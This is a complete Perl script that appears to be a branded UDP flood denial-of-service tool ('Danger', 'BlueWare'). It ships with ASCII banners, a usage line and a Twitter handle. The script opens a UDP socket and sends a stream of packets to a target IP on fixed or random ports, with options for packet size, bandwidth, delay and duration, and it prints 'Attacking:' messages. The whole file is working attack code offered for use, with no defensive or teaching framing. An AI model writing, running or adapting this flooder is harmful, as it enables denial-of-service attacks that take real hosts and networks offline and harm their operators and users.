#!/usr/bin/perl

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,
	"size=i" => \$size,
	"bandwidth=i" => \$bw,
	"time=i" => \$time,
	"delay=f"=> \$delay,
	"help|?" => \$help);
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';

 _______    ______   __    __   ______   ________  _______  
/       \  /      \ /  \  /  | /      \ /        |/       \ 
$$$$$$$  |/$$$$$$  |$$  \ $$ |/$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$ |  $$ |$$ |__$$ |$$$  \$$ |$$ | _$$/ $$ |__    $$ |__$$ |
$$ |  $$ |$$    $$ |$$$$  $$ |$$ |/    |$$    |   $$    $$< 
$$ |  $$ |$$$$$$$$ |$$ $$ $$ |$$ |$$$$ |$$$$$/    $$$$$$$  |
$$ |__$$ |$$ |  $$ |$$ |$$$$ |$$ \__$$ |$$ |_____ $$ |  $$ |
$$    $$/ $$ |  $$ |$$ | $$$ |$$    $$/ $$       |$$ |  $$ |
$$$$$$$/  $$/   $$/ $$/   $$/  $$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                            
Created by: Danger

How to use: perl danger.pl 1.1.1.1 80 65500 0

Twitter: @dangerbw44

# BlueWare #
 
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: computed packet size overwrites the --size parameter ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<'EOL';
 _______    ______   __    __   ______   ________  _______  
/       \  /      \ /  \  /  | /      \ /        |/       \ 
$$$$$$$  |/$$$$$$  |$$  \ $$ |/$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$ |  $$ |$$ |__$$ |$$$  \$$ |$$ | _$$/ $$ |__    $$ |__$$ |
$$ |  $$ |$$    $$ |$$$$  $$ |$$ |/    |$$    |   $$    $$< 
$$ |  $$ |$$$$$$$$ |$$ $$ $$ |$$ |$$$$ |$$$$$/    $$$$$$$  |
$$ |__$$ |$$ |  $$ |$$ |$$$$ |$$ \__$$ |$$ |_____ $$ |  $$ |
$$    $$/ $$ |  $$ |$$ | $$$ |$$    $$/ $$       |$$ |  $$ |
$$$$$$$/  $$/   $$/ $$/   $$/  $$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                            
EOL

print "Attacking: $ip " . ($port ? $port : " > Created by") . " D A N G E R <" . 
  ($size ? "$size-byte" : "") . "" . ($time ? " for $time seconds" : "") . "\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print "To stop the attack press: Ctrl+C\n" unless $time;

die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}